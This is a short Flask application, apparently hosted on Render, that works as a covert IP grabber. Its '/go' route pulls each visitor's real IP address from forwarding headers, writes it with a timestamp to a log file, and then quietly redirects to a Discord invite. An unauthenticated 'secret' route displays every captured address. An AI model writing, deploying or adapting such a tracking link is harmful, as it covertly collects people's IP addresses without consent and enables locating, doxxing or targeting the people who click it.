from flask import Flask, request, redirect
from datetime import datetime, timedelta
import os

app = Flask(__name__)

# Function to write to the log file
def log_ip(ip):
    # Render servers use UTC. Adding 8 hours converts it to Philippine Time.
    ph_time = datetime.utcnow() + timedelta(hours=8)
    # Format the time for easier reading (12-hour format with AM/PM)
    timestamp = ph_time.strftime('%Y-%m-%d %I:%M:%S %p')
    
    # Note: 'ips.txt' is deleted every time Render restarts or redeploys
    with open("ips.txt", "a") as f:
        f.write(f"{timestamp} - {ip}\n")

@app.route('/')
def home():
    return "Server is running!"

@app.route('/go')
def track():
    # 1. Check for the Forwarded header
    x_forwarded = request.headers.get('X-Forwarded-For')
    
    if x_forwarded:
        # 2. Get the full list and grab the FIRST one (the real user)
        # We use .split(',')[0] and strip any extra spaces
        ip = x_forwarded.split(',')[0].strip()
    else:
        # 3. If that fails, check for X-Real-IP or remote_addr
        ip = request.headers.get('X-Real-IP', request.remote_addr)

    # 4. Critical: If the IP is still a Render internal IP, try another method
    if ip.startswith('209.35') or ip.startswith('10.'):
        # This forces the app to look deeper if it accidentally caught the proxy
        ip = request.environ.get('HTTP_X_FORWARDED_FOR', ip).split(',')[0].strip()

    log_ip(ip)
    return redirect("https://discord.gg/TMKATk684K")

# Secret route to view your logs in the browser
@app.route('/my-secret-logs')
def show_logs():
    if os.path.exists("ips.txt"):
        with open("ips.txt", "r") as f:
            # Using <pre> keeps the formatting clean in the browser
            return f"<pre>{f.read()}</pre>"
    return "No logs captured yet!"

if __name__ == '__main__':
    # Dynamic port binding for Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)